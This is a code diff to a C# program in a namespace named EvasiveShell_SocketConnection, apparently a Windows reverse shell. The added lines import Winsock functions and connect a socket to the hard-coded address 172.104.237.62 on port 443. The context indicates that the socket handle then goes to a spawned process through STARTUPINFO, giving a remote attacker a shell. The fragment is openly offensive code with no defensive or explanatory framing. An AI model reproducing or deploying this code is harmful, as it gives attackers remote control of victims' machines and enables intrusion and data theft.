@@ -125,6 +125,13 @@ namespace EvasiveShell_SocketConnection
       public uint[] ChainEntries;
     }
 
+    [DllImport("Ws2_32.dll", SetLastError = true)]
+    public static extern ushort htons(ushort port);
+
+    [DllImport("Ws2_32.dll", SetLastError = true)]
+    public static extern uint inet_addr(string ipAddress);
+
+
     static void Main(string[] args)
     {
       Helpers.InitializeWSA();
@@ -144,6 +151,16 @@ namespace EvasiveShell_SocketConnection
       
       if (socket == IntPtr.Zero)
         Environment.Exit(1);
+
+      var sockAddrIn = new sockaddr_in();
+      sockAddrIn.sin_family = 2;
+      sockAddrIn.sin_port = htons(443);
+      sockAddrIn.sin_addr.S_addr = inet_addr("172.104.237.62");
+
+      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
+      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
+
+      connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
 
       var socketHandle = new SafeSocketHandle(socket, false);
       STARTUPINFO startupInfo = new STARTUPINFO();
